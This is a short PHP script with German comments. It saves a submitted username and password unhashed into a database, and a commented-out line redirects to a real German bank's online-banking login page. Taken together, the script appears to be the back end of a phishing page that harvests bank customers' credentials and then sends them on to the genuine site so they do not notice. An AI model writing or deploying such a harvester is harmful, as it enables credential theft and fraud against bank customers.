<?php
require_once 'global/db_connect.php';  // Stelle sicher, dass hier der korrekte Pfad zur Datenbankverbindung steht

// Überprüfen, ob die Daten über POST gesendet wurden
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Sicherstellen, dass sowohl username als auch password gesetzt sind
    if (isset($_POST['username']) && isset($_POST['password'])) {
        $username = $_POST['username'];
        $password = $_POST['password'];  // Hier könnte man das Passwort noch verschlüsseln mit z.B. password_hash()

        // SQL-Statement vorbereiten, um Daten in die Datenbank einzufügen
        $sql = "INSERT INTO users (username, password) VALUES (?, ?)";
        $stmt = $conn->prepare($sql);

        // Überprüfen, ob das Statement erfolgreich vorbereitet wurde
        if ($stmt) {
            // Eingabedaten an das Statement binden
            $stmt->bind_param("ss", $username, $password);

            // Das Statement ausführen
            if ($stmt->execute()) {
                // header('Location: https://www.vrbankeg.de/services_auth/auth-frontend/?v=02f946ef4305131b&client_id=fkp&redirect_uri=https:%2F%2Fwww.vrbankeg.de%2Fservices_cloud%2Fportal%2Fportal-oauth%2Flogin');
                exit;            } else {
                echo "Fehler beim Hinzufügen der Daten.";
            }

            // Das Statement schließen
            $stmt->close();
        } else {
            echo "Fehler bei der Vorbereitung des SQL-Statements.";
        }

        // Verbindung schließen
        $conn->close();
    } else {
        echo "Benutzername und Passwort müssen beide angegeben werden.";
    }
} else {
    echo "Fehlerhafte Anfrage. Bitte senden Sie die Daten per POST.";
}
?>